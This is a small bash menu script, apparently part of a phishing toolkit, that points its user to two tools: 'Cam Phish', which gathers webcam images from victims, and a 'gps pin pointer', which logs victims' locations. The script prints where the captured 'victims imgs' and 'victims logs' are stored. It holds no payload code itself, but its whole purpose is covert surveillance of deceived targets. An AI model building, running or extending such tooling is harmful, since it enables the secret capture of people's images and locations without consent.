#!/bin/bash

# Clear the terminal
clear

# Display menu options
echo "1. Cam Phish"
echo "2. gps pin pointer"
echo "0. Exit"

# Read user input
read -p "Choose an option: " choice

# Handle user input
case $choice in
    1)
        # Display a message and wait for user to press Enter
        echo "Start camphisher by saying cd tools/phishers and then bash camphish.sh"
        echo "Find the victims imgs in cd tools/phishers/imgs"
        read -p "Press [Enter] to return to the menu or exit..."
        ;;
    2)
        # Display a message and wait for user to press Enter
        echo "Start gps pin pointer by saying cd tools/phishers and then bash gps.sh"
        echo "Find the victims logs in cd tools/phishers/ and then open logs.txt"
        read -p "Press [Enter] to return to the menu or exit..."
        ;;
    
    0)
        # Exit the script
        echo "Exiting..."
        exit 0
        ;;
    *)
        # Invalid choice
        echo "Invalid choice, please enter 1 or 0."
        ;;
esac

# Optionally, you could loop the script to show the menu again after handling an option
exec "$0"
